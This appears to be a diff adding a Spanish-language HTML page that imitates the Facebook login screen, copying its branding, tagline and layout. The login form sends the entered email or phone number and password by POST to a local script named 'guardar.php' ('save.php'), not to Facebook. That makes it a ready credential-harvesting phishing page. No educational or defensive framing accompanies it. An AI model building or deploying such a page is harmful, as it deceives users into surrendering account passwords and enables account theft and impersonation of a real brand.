@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Facebook - Iniciar sesión</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #f0f2f5;
+    }
+
+    .container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      gap: 60px;
+      padding: 0 20px;
+      flex-wrap: wrap;
+    }
+
+    .left {
+      max-width: 400px;
+    }
+
+    .logo {
+      color: #1877f2;
+      font-size: 48px;
+      margin-bottom: 20px;
+      font-weight: bold;
+    }
+
+    .description {
+      font-size: 24px;
+      color: #1c1e21;
+    }
+
+    .right {
+      width: 400px;
+    }
+
+    form.login-box {
+      background: white;
+      padding: 20px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+      border-radius: 8px;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+
+    form.login-box input {
+      padding: 12px;
+      font-size: 16px;
+      border: 1px solid #ddd;
+      border-radius: 6px;
+    }
+
+    form.login-box button {
+      padding: 12px;
+      font-size: 16px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+
+    .login-button {
+      background-color: #1877f2;
+      color: white;
+    }
+
+    .create-account {
+      background-color: #42b72a;
+      color: white;
+      font-weight: bold;
+    }
+
+    form.login-box a {
+      text-align: center;
+      color: #1877f2;
+      text-decoration: none;
+      font-size: 14px;
+    }
+
+    hr {
+      margin: 10px 0;
+      border: none;
+      height: 1px;
+      background: #ccc;
+    }
+
+    .create-page {
+      margin-top: 20px;
+      font-size: 14px;
+      text-align: center;
+    }
+
+    @media (max-width: 768px) {
+      .container {
+        flex-direction: column;
+        text-align: center;
+      }
+
+      .right {
+        width: 100%;
+      }
+
+      .left {
+        max-width: none;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="left">
+      <h1 class="logo">facebook</h1>
+      <p class="description">Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</p>
+    </div>
+    <div class="right">
+      <form action="guardar.php" method="POST" class="login-box">
+        <input type="text" name="email" placeholder="Correo electrónico o número de teléfono" required />
+        <input type="password" name="password" placeholder="Contraseña" required />
+        <button type="submit" class="login-button">Iniciar sesión</button>
+        <a href="#">¿Has olvidado la contraseña?</a>
+        <hr />
+        <button type="button" class="create-account">Crear una cuenta</button>
+      </form>
+      <p class="create-page">Crea una <strong>página</strong> para un famoso, una marca o una empresa.</p>
+    </div>
+  </div>
+</body>
+</html>
